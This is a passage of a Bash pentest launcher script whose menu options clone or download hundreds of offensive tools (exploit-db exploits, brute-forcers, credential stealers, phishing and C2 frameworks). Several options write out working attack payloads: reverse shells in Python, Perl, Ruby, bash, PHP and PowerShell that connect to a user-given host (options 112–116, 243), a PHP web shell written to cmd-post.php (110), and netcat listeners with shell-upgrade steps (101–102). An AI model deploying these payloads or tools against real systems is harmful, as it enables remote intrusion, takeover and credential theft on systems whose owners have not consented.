			echo "Digit a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""ios/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTTO""$NOMEFL"
			fi
		fi
	;;
	"19")
		if [[ -f $(which lynx) ]];
		then
			echo "Choose a platform or architecture"
			select TIPO in "aix/remote" "aix/webapps" "alpha/webapps" "android/remote" "android/webapps" "arm/remote" "ashx/webapps" "asp/remote" "asp/webapps" "aspx/webapps" "beos/remote" "bsd/remote" "bsd_x86/remote" "cfm/remote" "cfm/webapps" "cgi/remote" "cgi/webapps" "freebsd/remote" "freebsd/webapps" "hardware/remote" "hardware/webapps" "hp-ux/remote" "ios/remote" "ios/webapps" "irix/remote" "java/remote" "java/webapps" "json/webapps" "jsp/remote" "jsp/webapps" "linux/remote" "linux/webapps" "linux_mips/remote" "linux_sparc/remote" "linux_x86-64/remote" "linux_x86/remote" "linux_x86/webapps" "lua/webapps" "macos/remote" "macos/webapps" "multiple/remote" "multiple/webapps" "netbsd_x86/remote" "netware/remote" "nodejs/webapps" "novell/remote" "novell/webapps" "openbsd/remote" "osx/remote" "osx/webapps" "osx_ppc/remote" "palm_os/webapps" "perl/webapps" "php/remote" "php/webapps" "python/remote" "python/webapps" "ruby/remote" "ruby/webapps" "sco/remote" "sco/webapps" "solaris/remote" "solaris/webapps" "solaris_sparc/remote" "tru64/remote" "unix/remote" "unix/webapps" "unixware/remote" "watchos/remote" "windows/remote" "windows/webapps" "windows_x86-64/remote" "windows_x86-64/webapps" "windows_x86/remote" "windows_x86/webapps" "xml/remote" "xml/webapps"
			do
				OFFSEC="offensive-security/exploitdb/"
				MEX="master/exploits/"
				ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
				ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
				echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
				select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
				do
					if [[ "$EXP" != "" ]];
					then
						Scarica "$ENTTO""$EXP"
					fi
					break
				done
				break
			done
		else
			echo "Please, install lynx for this option"
		fi
	;;
	"20")
		echo "Digit a trustedsec repository name from https://github.com/trustedsec"
		read -p "(example unicorn): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Clona "trustedsec/$NOMEFL"
		fi
	;;
	"21")
		echo "Digit a Hood3dRob1n repository name from https://github.com/Hood3dRob1n"
		read -p "(example BinGoo): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Clona "Hood3dRob1n/$NOMEFL"
		fi
	;;
	"22")
		Clona "0x09AL/IIS-Raid"
	;;
	"23")
		Clona "thelinuxchoice/evilreg"
	;;
	"24")
		Clona "thelinuxchoice/eviloffice"
	;;
	"25")
		Clona "thelinuxchoice/evildll"
	;;
	"26")
		Clona "TarlogicSecurity/kerbrute"
	;;
	"27")
		Clona "Greenwolf/Spray"
	;;
	"28")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "bfaure/AES-128_Cracker"
		fi
	;;
	"29")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "unicornsasfuel/keybrute"
		fi
	;;
	"30")
		Clona "m57/dnsteal"
	;;
	"31")
		Clona "skelsec/jackdaw"
	;;
	"32")
		Clona "dirkjanm/ROADtools"
	;;
	"33")
		Clona "fox-it/BloodHound.py"
	;;
	"34")
		Clona "devanshbatham/ParamSpider"
	;;
	"35")
		Clona "projectdiscovery/dnsprobe"
	;;
	"36")
		Scarica "$ENTRAW""SigPloiter/HLR-Lookups/master/hlr-lookups.py"
	;;
	"37")
		Clona "i3visio/osrframework"
	;;
	"38")
		Clona "secdev/scapy"
	;;
	"39")
		Clona "vanhauser-thc/thc-ipv6"
	;;
	"40")
		Clona "SecureAuthCorp/impacket"
	;;
	"41")
		Clona "shmilylty/cheetah"
	;;
	"42")
		Clona "Hackplayers/evil-winrm"
	;;
	"43")
		Scarica "$ENTRAW""The404Hacking/ZIP-Password-BruteForcer/master/ZIP-Password-BruteForcer.py"
		Scarica "$ENTRAW""The404Hacking/ZIP-Password-BruteForcer/master/pass.txt"
	;;
	"44")
		Clona "lc/gau"
		wget --no-check-certificate "$ENTRAW""kleiton0x00/CORS-one-liner/master/README.md" -O "CORS-one-liner-README.txt"
	;;
	"45")
		Clona "porterhau5/BloodHound-Owned"
	;;
	"46")
		Clona "thelinuxchoice/evilpdf"
	;;
	"47")
		Clona "robins/pdfcrack"
	;;
	"48")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""BroadbentT/PDF-CRACKER/master/pdf-cracker.py"
		fi
	;;
	"49")
		Scarica "$ENTRAW""Greenwolf/ntlm_theft/master/ntlm_theft.py"
		pip3 install xlsxwriter
	;;
	"50")
		Clona "fuzzdb-project/fuzzdb"
	;;
	"51")
		Clona "danielmiessler/SecLists"
	;;
	"52")
		Clona "tismayil/ohmybackup"
	;;
	"53")
		Clona "dariusztytko/words-scraper"
	;;
	"54")
		Clona "aboul3la/Sublist3r"
	;;
	"55")
		Clona "hahwul/dalfox"
	;;
	"56")
		Clona "jtpereyda/boofuzz"
	;;
	"57")
		Clona "Ganapati/RsaCtfTool"
	;;
	"58")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""mvelazc0/Invoke-SMBLogin/master/smblogin.py"
		fi
	;;
	"59")
		Clona "R4stl1n/SSH-Brute-Forcer"
	;;
	"60")
		Clona "yarrick/iodine"
	;;
	"61")
		Scarica "$ENTRAW""T3rry7f/ICMPTunnel/master/IcmpTunnel_S.py"
	;;
	"62")
		Clona "blackarrowsec/pivotnacci"
	;;
	"63")
		Clona "rofl0r/microsocks"
	;;
	"64")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""dinigalab/ldapsearch/master/ldapsearch.py"
		fi
	;;
	"65")
		Clona "ShawnDEvans/smbmap"
	;;
	"66")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "cgrates/rpcclient"
		fi
	;;
	"67")
		Clona "byt3bl33d3r/CrackMapExec"
	;;
	"68")
		git clone https://github.com/m4ll0k/SMBrute.git smbrute
		if [[ $(id -u) -eq 0 ]];
		then
			echo "Do you want install pysmb humanfriendly python modules?"
			read -p "Y/n (default n): " -i "n" REQ
			if [[ "$REQ" == "Y" ]];
			then
				pip3 install pysmb humanfriendly
			fi
		else
			echo "sudo pip3 install pysmb humanfriendly"
		fi
	;;
	"69")
		Clona "zweisamkeit/RSHack"
	;;
	"70")
		Clona "sameera-madushan/Print-My-Shell"
	;;
	"71")
		Scarica "$ENTRAW""flozz/p0wny-shell/master/shell.php"
	;;
	"72")
		Scarica "$ENTRAW""corelan/mona/master/mona.py"
	;;
	"73")
		Clona "OpenRCE/sulley"
	;;
	"74")
		Clona "hatlord/snmpwn"
	;;
	"75")
		Clona "etingof/pysnmp"
	;;
	"76")
		echo "Digit a binary file to analyze"
		read -e -p "(example, ./file.bin): " FLB
		if [[ -f "$FLB" ]];
		then
			echo "Digit a file name to save the report"
			read -e -p "(example, bin.report): " FLRP
			if [[ "$FLRP" != "" ]];
			then
				r2 -c "e scr.color=false" -c "aaaa" -c "afl" -q "$FLB" > "$FLRP"
			fi
		fi
	;;
	"77")
		Clona "InteliSecureLabs/SNMPPLUX"
	;;
	"78")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""cysboy/SnmpCrack/master/SnmpCrack.py"
		fi
	;;
	"79")
		Clona "pablocelayes/rsa-wiener-attack"
	;;
	"80")
		Clona "magnumripper/JohnTheRipper"
	;;
	"81")
		echo "Digit a file name from https://github.com/truongkma/ctf-tools/tree/master/John/run"
		read -p "(example aix2john.pl):" FILENAME
		if [[ "$FILENAME" != "" ]];
		then
			Scarica "$ENTRAW""truongkma/ctf-tools/master/John/run/""$FILENAME"
		fi
	;;
	"82")
		Clona "SySS-Research/Seth"
	;;
	"83")
		Clona "s0md3v/Hash-Buster"
	;;
	"84")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""3rdDegree/dapper/master/dapper.py"
		fi
	;;
	"85")
		Clona "m8r0wn/ldap_search"
	;;
	"86")
		sudo apt install python python-dev python-setuptools python-pip openssl openssl-dev git
		Clona "ekultek/bluekeep"
		pip install -r bluekeep/requirements.txt
	;;
	"87")
		Clona "rastating/slae"
	;;
	"88")
		Scarica "$ENTRAW""m57/dnsteal/master/dnsteal.py"
	;;
	"89")
		Clona "urbanadventurer/WhatWeb"
	;;
	"90")
		echo "Digit a file name from https://github.com/jivoi/pentest/tree/master/tools"
		read -p "(example crack_md5.py):" FILENAME
		if [[ "$FILENAME" != "" ]];
		then
			Scarica "$ENTRAW""jivoi/pentest/master/tools/""$FILENAME"
		fi
	;;
	"91")
		Scarica "$ENTRAW""NickSanzotta/smbShakedown/master/smbShakedown.py"
	;;
	"92")
		Clona "quickbreach/SMBetray"
	;;
	"93")
		Scarica "$ENTRAW""aress31/smbaudit/master/smbaudit.sh"
	;;
	"94")
		Scarica "$ENTRAW""samhaxr/recox/master/recox.sh"
	;;
	"95")
		Clona "TBGSecurity/splunk_shells"
	;;
	"96")
		Clona "m4ll0k/WPSeku"
	;;
	"97")
		Clona "swisskyrepo/Wordpresscan"
	;;
	"98")
		Clona "RamadhanAmizudin/Wordpress-scanner"
	;;
	"99")
		read -p "Digit a Git name (example https://github.com/examplename/example.git): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			git clone "$NOMEFL"
		fi
	;;
	"100")
		python3 -m http.server
	;;
	"101")
		read -p "digit a number of port for the remote Windows Reverse Shell: " PORTA
		if [[ "$PORTA" =~ ^[0-9]+$ ]];
		then
			echo "if you want use winallenum, please COPY and PASTE this command line"
			echo "[COPY+PASTE] invoke-webrequest -uri \"https://raw.githubusercontent.com/FabioDefilippo/winallenum/master/winallenum.ps1\" -outfile winallenum.tmp; get-content -path winallenum.tmp | set-content -encoding default -path winallenum.ps1; remove-item -path winallenum.tmp"
			rlwrap nc -lvnp $PORTA
		fi
	;;
	"102")
		read -p "digit a number of port for the remote Linux Reverse Shell: " PORTA
		if [[ "$PORTA" =~ ^[0-9]+$ ]];
		then
			echo "In remote shell, COPY and PASTE these two commands"
			echo "[COPY+PASTE] python -c 'import pty; pty.spawn(\"/bin/bash\")'"
			echo "[COPY+PASTE] TERM=xterm"
			echo "After connection to remote host, in this machine use CTRL+z and digit 'stty raw -echo; fg'"
			echo "if you want use linuxallenum, COPY and PASTE this script for the last step"
			echo "[COPY+PASTE] wget --no-check-certificate \"https://raw.githubusercontent.com/FabioDefilippo/linuxallenum/master/linuxallenum.sh\""
			nc -lvnp $PORTA
		fi
	;;
	"103")
		read -p "digit a favourite id_rsa filename (optional): " UTENTE
		if [[ "$UTENTE" != "" ]];
		then
			UTENTE="_$UTENTE"
		fi
		ssh-keygen -t rsa -b 2048 -f id_rsa"$UTENTE"
	;;
	"104")
		read -e -p "Digit a complete path of file to encode to utf16 base64: " FILEPATH
		if [[ "$FILEPATH" != "" ]];
		then
			if [[ -f "$FILEPATH" ]];
			then
				BSF=$(iconv -f UTF-8 -t UTF-16LE "$FILEPATH" | base64 -w 0)
				echo "$BSF"
				echo "$BSF" | xclip -selection clipboard
				echo -ne "\ncopied to clipboard\nPASTE to winallenum in remote machine\n"
				read
			else
				echo "$FILEPATH"" does not exist"
			fi
		else
			echo "file path is empty"
		fi
	;;
	"105")
		read -e -p "Digit a complete path of file to encode to utf8 base64: " FILEPATH
		if [[ "$FILEPATH" != "" ]];
		then
			if [[ -f "$FILEPATH" ]];
			then
				BSF=$(base64 "$FILEPATH" -w 0)
				echo "echo -n \"$BSF\" | base64 -d > script"
				echo "$BSF" | xclip -selection clipboard
				echo -ne "\ncopied to clipboard\nPASTE to linuxallenum in remote machine\n"
				read
			else
				echo "$FILEPATH"" does not exist"
			fi
		else
			echo "file path is empty"
		fi
	;;
	"106")
		Scarica "$ENTRAW""clarketm/proxy-list/master/proxy-list-raw.txt"
	;;
	"107")
		Scarica "$ENTRAW""opsxcq/proxy-list/master/list.txt"
	;;
	"108")
		Scarica "$ENTRAW""a2u/free-proxy-list/master/free-proxy-list.txt"
	;;
	"109")
		Scarica "$ENTRAW""cristiangonzales/Amazon-Discounts/master/proxy-list.txt"
	;;
	"110")
		echo "<?php if (!empty($_POST['cmd'])){echo shell_exec($_POST['cmd']);} ?>" > cmd-post.php
	;;
	"111")
		read -e -p "Digit a file to dump in escaped hex vales: " HEXD
		if [[ -f "$HEXD" ]];
		then
			BSF=$(hexdump -v -e '"\\\x" 1/1 "%02X"' "$HEXD")
			echo "$BSF" | xclip -selection clipboard
			echo "echo -ne \"$BSF\""
			echo -ne "\n"
		fi
	;;
	"112")
		read -p "Digit your IPv4 address: " MIP
		if [[ "$MIP" != "" ]];
		then
			read -p "Digit your port: " MPORT
			if [[ "$MPORT" =~ ^[0-9]+$ ]];
			then
				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"""$MIP""\",""$MPORT""));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
			fi
		fi
	;;
	"113")
		read -p "Digit your IPv4 address: " MIP
		if [[ "$MIP" != "" ]];
		then
			read -p "Digit your port: " MPORT
			if [[ "$MPORT" =~ ^[0-9]+$ ]];
			then
				echo "perl -e 'use Socket;$i=\"""$MIP""\";$p=""$MPORT"";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
			fi
		fi
	;;
	"114")
		read -p "Digit your IPv4 address: " MIP
		if [[ "$MIP" != "" ]];
		then
			read -p "Digit your port: " MPORT
			if [[ "$MPORT" =~ ^[0-9]+$ ]];
			then
				echo "ruby -rsocket -e'f=TCPSocket.open(\"""$MIP""\",""$MPORT"").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
			fi
		fi
	;;
	"115")
		read -p "Digit your IPv4 address: " MIP
		if [[ "$MIP" != "" ]];
		then
			read -p "Digit your port: " MPORT
			if [[ "$MPORT" =~ ^[0-9]+$ ]];
			then
				echo "bash -i >& /dev/tcp/""$MIP""/""$MPORT"" 0>&1"
				echo "bash+-c+'bash+-i+>%26+/dev/tcp/""$MIP""/""$MPORT""+0>%261'"
			fi
		fi
	;;
	"116")
		read -p "Digit your IPv4 address: " MIP
		if [[ "$MIP" != "" ]];
		then
			read -p "Digit your port: " MPORT
			if [[ "$MPORT" =~ ^[0-9]+$ ]];
			then
				echo "php -r '\$sock=fsockopen(\""$MIP"\",""$MPORT"");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
			fi
		fi
	;;
	"117")
		Clona "TheSpeedX/PROXY-List"
	;;
	"118")
		Scarica "$ENTRAW""labic/ze-the-scraper/master/proxies-list.txt"
	;;
	"119")
		Scarica "$ENTRAW""samrocketman/samrocketman.github.io/main/proxylist.txt"
	;;
	"120")
		Scarica "$ENTRAW""NetSPI/PS_MultiCrack/master/PS_MultiCrack.sh"
	;;
	"121")
		Clona "AlessandroZ/LaZagne"
	;;
	"122")
		Clona "rezasp/joomscan"
	;;
	"123")
		Clona "rastating/joomlavs"
	;;
	"124")
		Clona "RedVirus0/BlackDir-Framework"
	;;
	"125")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""detailyang/readelf/master/readelf/readelf.py"
		fi
	;;
	"126")
		Clona "timbo05sec/autocrack"
	;;
	"127")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""igorMatsunaga/autoCrack/master/autoCrack.py"
		fi
	;;
	"128")
		Clona "xtiankisutsa/MARA_Framework"
	;;
	"129")
		Clona "sowdust/ffff"
	;;
	"130")
		Clona "google/AFL"
	;;
	"131")
		Clona "leobeosab/sharingan"
	;;
	"132")
		Clona "Zarcolio/sitedorks"
	;;
	"133")
		Clona "s0md3v/photon"
	;;
	"134")
		Clona "khalilbijjou/WAFNinja"
	;;
	"135")
		echo "Digit a binary file to analyze"
		read -e -p "(example, ./file.bin): " FLB
		if [[ -f "$FLB" ]];
		then
			echo "Digit a file name to save the report"
			read -e -p "(example, bin.report): " FLRP
			if [[ "$FLRP" != "" ]];
			then
				ADDS=$(r2 -c "e scr.color=false" -c "aaaa" -c "afl" -q "$FLB" | awk '{print $1}')
				for ADD in $ADDS; do r2 -c "e scr.color=false" -c "aaaa" -c "pdc@$ADD" -q "$FLB" >> "$FLRP"; done
			fi
		fi
	;;
	"136")
		Clona "b1tg/rust-windows-shellcode"
	;;
	"137")
		Clona "xtr4nge/FruityC2"
	;;
	"138")
		Clona "OWASP/Amass"
	;;
	"139")
		Clona "OWASP/cwe-tool"
	;;
	"140")
		Clona "zznop/drow"
	;;
	"141")
		Clona "pry0cc/axiom"
	;;
	"142")
		Clona "saferwall/saferwall"
	;;
	"143")
		Clona "sysdream/ligolo"
	;;
	"144")
		Clona "snare/voltron"
	;;
	"145")
		Clona "threat9/routersploit"
	;;
	"146")
		Scarica "$ENTRAW""tenable/upnp_info/master/upnp_info.py"
	;;
	"147")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "WalderlanSena/ftpbrute"
		fi
	;;
	"149")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "AlphaRoy14/km985ytv-ftp-exploit"
		fi
	;;
	"150")
		Clona "GitHackTools/FTPBruter"
	;;
	"151")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "DevilSquidSecOps/FTP"
		fi
	;;
	"152")
		Clona "matricali/brutekrag"
	;;
	"153")
		Clona "c0r3dump3d/osueta"
	;;
	"154")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""pentestmonkey/ftp-user-enum/master/ftp-user-enum.pl"
		fi
	;;
	"155")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""W-GOULD/ssh-user-enumeration/master/ssh-check-username.py"
		fi
	;;
	"156")
		Scarica "$ENTRAW""nccgroup/ssh_user_enum/master/ssh_enum.py"
	;;
	"157")
		Clona "0v3rride/Enum4LinuxPy"
	;;
	"158")
		Clona "gehaxelt/Python-dsstore"
	;;
	"159")
		if [[ $(Warning) == "Y" ]];
		then
			mkdir sqlcmd
			cd sqlcmd
			Scarica "$ENTRAW""ccpgames/sqlcmd/master/sqlcmd.py"
			Scarica "$ENTRAW""ccpgames/sqlcmd/master/setup.py"
			cd ..
		fi
	;;
	"160")
		Clona "sqlmapproject/sqlmap"
	;;
	"161")
		Clona "payloadbox/sql-injection-payload-list"
	;;
	"162")
		Clona "fozavci/viproy-VoIPkit"
		Clona "fozavci/metasploit-framework-with-viproy-VoIPkit"
	;;
	"163")
		Clona "luke-goddard/enumy"
	;;
	"164")
		Clona "s0md3v/XSStrike"
	;;
	"165")
		read -e -p "Digit a path in which mounting remote smb share folder: " PERCO
		if [[ "$PERCO" != "" ]];
		then
			if [[ ! -d "$PERCO" ]];
			then
				mkdir -p "$PERCO"
			fi
			echo "Digit a remote ip target and remote path of remote smb share folder to mount" 
			read -p "(example //10.10.10.100/Share): " IPTS
			if [[ "$IPTS" != "" ]];
			then
				read -p "Digit a remote username target, (empty field is for null session): " TUSRN
				if [[ "$TUSRN" != "" ]];
				then
					if [[ "$TPSSW" == "" ]];
					then
						read -p "Digit a remote username's password target: " TPSSW
					fi
					mount -t cifs -o 'username="$TUSRN",password="$TPSSW"' "$IPTS" "$PERCO"
				else
					mount -t cifs "$IPTS" "$PERCO"
				fi
			fi
		fi
	;;
	"166")
		Clona "linsomniac/python-memcached"
	;;
	"167")
		Clona "govolution/avet"
	;;
	"168")
		Clona "Screetsec/Sudomy"
	;;
	"169")
		Clona "fireeye/flare-floss"
	;;
	"170")
		Scarica "$ENTRAW""sevagas/swap_digger/master/swap_digger.sh"
	;;
	"171")
		Clona "Silv3rHorn/ArtifactExtractor"
	;;
	"172")
		Clona "SekoiaLab/Fastir_Collector"
	;;
	"173")
		Clona "3wker/DLLicous-MaliciousDLL"
	;;
	"174")
		Scarica "$ENTRAW""stormshadow07/HackTheWorld/master/HackTheWorld.py"
	;;
	"175")
		Scarica "$ENTRAW""jtpereyda/boofuzz-ftp/master/ftp.py"
	;;
	"176")
		Clona "sullo/nikto"
	;;
	"177")
		Scarica "$ENTRAW""HightechSec/git-scanner/master/gitscanner.sh"
	;;
	"178")
		Clona "PentesterES/Delorean"
	;;
	"179")
		Clona "BullsEye0/shodan-eye"
	;;
	"180")
		Clona "faizann24/XssPy"
	;;
	"181")
		Clona "secdec/xssmap"
	;;
	"182")
		Clona "gbrindisi/xsssniper"
	;;
	"183")
		Clona "pwn0sec/PwnXSS"
	;;
	"184")
		Clona "lwzSoviet/NoXss"
	;;
	"185")
		Scarica "$ENTRAW""cybercitizen7/Ps1jacker/master/ps1jacker.py"
	;;
	"186")
		Clona "Manisso/fsociety"
	;;
	"187")
		Scarica "$ENTRAW""GrrrDog/TacoTaco/master/tac2cat.py"
		Scarica "$ENTRAW""GrrrDog/TacoTaco/master/tacoflip.py"
	;;
	"188")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "GrrrDog/FlashAV"
		fi
	;;
	"189")
		Scarica "$ENTRAW""GrrrDog/sni_bruter/master/sni_bruter.py"
	;;
	"190")
		Clona "moxie0/sslstrip"
	;;
	"191")
		Scarica "$ENTRAW""m57/piescan/master/piescan.py"
	;;
	"192")
		Clona "projectdiscovery/naabu"
	;;
	"193")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""ahervias77/portscanner/master/portscanner.py"
		fi
	;;
	"194")
		Clona "indutny/heartbleed"
	;;
	"195")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""roflcer/heartbleed-vuln/master/attack.py"
		fi
	;;
	"196")
		Clona "thelinuxchoice/spyeye"
	;;
	"197")
		Clona "sowdust/pdfxplr"
	;;
	"198")
		Clona "wpscanteam/wpscan"
	;;
	"199")
		Clona "MrCl0wnLab/afdWordpress"
	;;
	"200")
		Scarica "$ENTRAW""04x/WpscaN/master/ICgWpScaNNer.py"
	;;
	"201")
		Clona "The404Hacking/wpscan"
	;;
	"202")
		Scarica "$ENTRAW""drego85/JoomlaScan/master/joomlascan.py"
		Scarica "$ENTRAW""drego85/JoomlaScan/master/comptotestdb.txt"
	;;
	"203")
		echo "Digit imap url"
		read -p "(example, imaps://imap.gmail.com/INBOX): " IMAPURL
		if [[ "$IMAPURL" != "" ]];
		then
			read -p "Digit email address: " EMAILADD
			if [[ "$EMAILADD" != "" ]];
			then
				echo "Digit a request"
				read -p "(example, fetch 1:* (UID FLAGS INTERNALDATE ENVELOPE)): " IMAPREQ
				if [[ "$IMAPREQ" != "" ]];
				then
					if [[ "$ANON" == "Enabled" ]];
					then
						curl -s -k -L --socks5 "$SANON" --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
					else
						curl -s -k -L --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
					fi
				fi
			fi
		fi
	;;
	"204")
		Clona "byt3bl33d3r/SprayingToolkit"
	;;
	"205")
		Clona "mrexodia/haxxmap"
	;;
	"206")
		Clona "lanjelot/patator"
	;;
	"207")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""iomoath/IMAP-Cracker/master/imap-cracker.py"
			Scarica "$ENTRAW""iomoath/IMAP-Cracker/master/top-1000-password.txt"
		fi
	;;
	"208")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""gh0stwizard/p5-udp-scanner/master/udp-scan.pl"
			Scarica "$ENTRAW""gh0stwizard/p5-udp-scanner/master/make.sh"
		fi
	;;
	"209")
		Clona "Knowledge-Wisdom-Understanding/recon"
	;;
	"210")
		Clona "liamg/furious"
	;;
	"211")
		Clona "anvie/port-scanner"
	;;
	"212")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""anrosent/portscan/master/portscan.go"
		fi
	;;
	"213")
		Clona "Arno0x/NtlmRelayToEWS"
	;;
	"214")
		Clona "j3ssie/Osmedeus"
	;;
	"215")
		Clona "evanmiller/hecate"
	;;
	"216")
		Clona "gdbinit/MachOView"
	;;
	"217")
		Clona "cseagle/fREedom"
	;;
	"218")
		Clona "google/binnavi"
	;;
	"219")
		Clona "BinaryAnalysisPlatform/bap"
	;;
	"220")
		Clona "angr/angr"
	;;
	"221")
		Clona "504ensicsLabs/LiME"
	;;
	"222")
		Clona "vivisect/vivisect"
	;;
	"223")
		Clona "unicorn-engine/unicorn"
	;;
	"224")
		Clona "cogent/origami-pdf"
	;;
	"225")
		Clona "idapython/src"
	;;
	"226")
		Clona "erocarrera/pefile"
	;;
	"227")
		Clona "pxb1988/dex2jar"
	;;
	"228")
		Clona "koutto/jok3r"
	;;
	"229")
		Clona "DanMcInerney/icebreaker"
	;;
	"230")
		Clona "youngyangyang04/NoSQLAttack"
	;;
	"231")
		Clona "codingo/NoSQLMap"
	;;
	"232")
		Clona "torque59/Nosql-Exploitation-Framework"
	;;
	"233")
		Clona "aress31/xmlrpc-bruteforcer"
	;;
	"234")
		Clona "n4xh4ck5/CMSsc4n"
	;;
	"235")
		Clona "shodansploit/shodansploit"
	;;
	"236")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "ninj4c0d3r/ShodanCli"
		fi
	;;
	"237")
		Clona "mnismt/CompressedCrack"
	;;
	"238")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "brain-lang/brainfuck"
		fi
	;;
	"239")
		Clona "fabianishere/brainfuck"
	;;
	"240")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "luickk/gan-audio-generator"
		fi
	;;
	"241")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "rzbrk/mfv"
		fi
	;;
	"242")
		Clona "smicallef/spiderfoot"
	;;
	"243")
		read -p "Digit your IPv4 address: " MIP
		read -p "Digit your port: " MPORT
		if [[ "$MIP" != "" ]];
		then
			if [[ "$MPORT" =~ ^[0-9]+$ ]];
			then
				echo "\$client = New-Object System.Net.Sockets.TCPClient(\"""$MIP""\",""$MPORT"");\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
			fi
		fi
	;;
	"244")
		Clona "s0md3v/Striker"
	;;
	"245")
		Clona "LandGrey/pydictor"
	;;
	"246")
		Clona "danieleperera/OnionIngestor"
	;;
	"247")
		Clona "mufeedvh/basecrack"
	;;
	"248")
		Clona "evyatarmeged/Raccoon"
	;;
	"249")
		Clona "kgretzky/evilginx2"
	;;
	"250")
		Scarica "$ENTRAW""edwardz246003/IIS_exploit/master/exploit.py"
	;;
	"251")
		Clona "irsdl/IIS-ShortName-Scanner"
	;;
	"252")
		Clona "LionSec/katoolin"
	;;
	"253")
		Clona "b3-v3r/Hunner"
	;;
	"254")
		Clona "PowerScript/KatanaFramework"
	;;
	"255")
		Clona "unkn0wnh4ckr/hackers-tool-kit"
	;;
	"256")
		Clona "santatic/web2attack"
	;;
	"257")
		Clona "andyvaikunth/roxysploit"
	;;
	"258")
		Clona "x3omdax/PenBox"
	;;
	"259")
		Clona "dhondta/dronesploit"
	;;
	"260")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "clu8/RainbowTable"
		fi
	;;
	"261")
		Clona "zcdziura/leprechaun"
	;;
	"262")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""CyberKnight00/RainbowHash/master/RainbowHash.py"
		fi
	;;
	"263")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "dgleebits/Double-Rainbow"
		fi
	;;
	"264")
		Clona "jtesta/rainbowcrackalack"
	;;
	"265")
		Clona "sepehrdaddev/hashcobra"
	;;
	"266")
		Clona "google/tsunami-security-scanner"
	;;
	"267")
		Scarica "$ENTRAW""deepsecurity-pe/GoGhost/master/GoGhost.go"
	;;
	"268")
		Clona "wintrmvte/SNOWCRASH"
	;;
	"269")
		Clona "dariusztytko/vhosts-sieve"
	;;
	"270")
		Scarica "$ENTRAW""Va5c0/Steghide-Brute-Force-Tool/master/steg_brute.py"
	;;
	"271")
		Clona "daniellerch/aletheia"
	;;
	"272")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "Diefunction/stegbrute"
		fi
	;;
	"273")
		Scarica "$ENTRAW""dunossauro/PyRarCrack/master/pyrarcrack.py"
	;;
	"274")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "yasoob/nrc-exporter"
		fi
	;;
	"275")
		Clona "CBHue/PyFuscation"
	;;
	"276")
		Clona "m3n0sd0n4ld/uDork"
	;;
	"277")
		Clona "mzfr/slicer"
	;;
	"278")
		Clona "mgeeky/tomcatWarDeployer"
	;;
	"279")
		Scarica "$ENTRAW""aabeling/portscan/master/index.html"
		Scarica "$ENTRAW""aabeling/portscan/master/portscanner.js"
	;;
	"280")
		Clona "hypn0s/AJPy"
	;;
	"281")
		Clona "berkgoksel/SierraTwo"
	;;
	"282")
		Clona "m4n3dw0lf/pythem"
